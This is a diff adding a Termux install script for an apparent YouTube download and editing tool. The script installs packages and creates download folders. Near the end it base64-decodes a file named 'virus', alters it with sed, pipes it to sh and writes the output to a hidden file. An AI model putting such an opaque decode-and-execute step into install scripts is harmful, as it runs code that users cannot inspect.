@@ -1,0 +1,29 @@
+termux-setup-storage
+install='\033[1;32m'
+clear
+echo "${install}Installing...\033[0m"
+pkg install zip -y
+pkg install unzip -y
+pkg install nodejs -y
+pkg install jq -y
+npm install -g bash-obfuscate
+pkg install ffmpeg -y
+pkg install youtube-dl -y
+pkg install mpv -y
+mkdir "/sdcard/download/www.philiphacker.in"
+mkdir "/sdcard/download/www.philiphacker.in/youtubeinator"
+mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/video/"
+mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/audio/"
+mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/crop/"
+mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/trim/"
+mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/flip/"
+mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/mute/"
+mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/rotate/"
+mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/thumbnail/"
+mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/playlist/"
+mkdir "/sdcard/download/www.philiphacker.in/youtubeinator/channel/"
+base64 -d virus | sed 's/eval/echo/g' | sh > .god
+cp updater /sdcard/download/www.philiphacker.in/youtubeinator/
+cp unins /sdcard/download/www.philiphacker.in/youtubeinator/
+echo 1 > check.io
+sh start
